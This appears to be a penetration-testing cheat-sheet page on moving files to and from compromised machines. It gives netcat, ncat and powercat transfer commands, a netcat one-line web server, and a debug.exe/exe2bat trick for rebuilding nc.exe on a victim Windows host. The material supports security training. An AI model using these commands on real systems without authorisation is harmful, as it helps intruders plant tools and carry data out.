# ⭕ Other Methods

## <mark style="color:red;">netcat</mark>

#### push files from client to listener (and vice versa):

```
listener: nc -nvlp [local port] > [out file]
clinet: nc [ip] [remote port] < [in file]
```

### <mark style="color:orange;">netcat HTTP server</mark>

```
nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
```

#### this will serve a single webpage.

```
while true; do nc -l -p 80 -q 1 < error.html; done
```

## <mark style="color:red;">Powercat File Transfers</mark>

```
nc -lnvp 443 > receiving_powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

## <mark style="color:red;">ncat Secure Transfer</mark>

```
ncat -nvlp port --ssl > out-file
ncat -nv target-ip port --ssl < file-to-send
```

## <mark style="color:red;">debug.exe</mark>

This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.

Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:

```
upx -9 nc.exe
```

Now it only weights 29 kb. Perfect. So now let's disassemble it:

```
wine exe2bat.exe nc.exe nc.txt
```

Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe

## <mark style="color:red;">LOLBines For Windows</mark>

#### check out these windows native tools/utilities for file transfer (download)

{% embed url="https://lolbas-project.github.io/#/download" %}
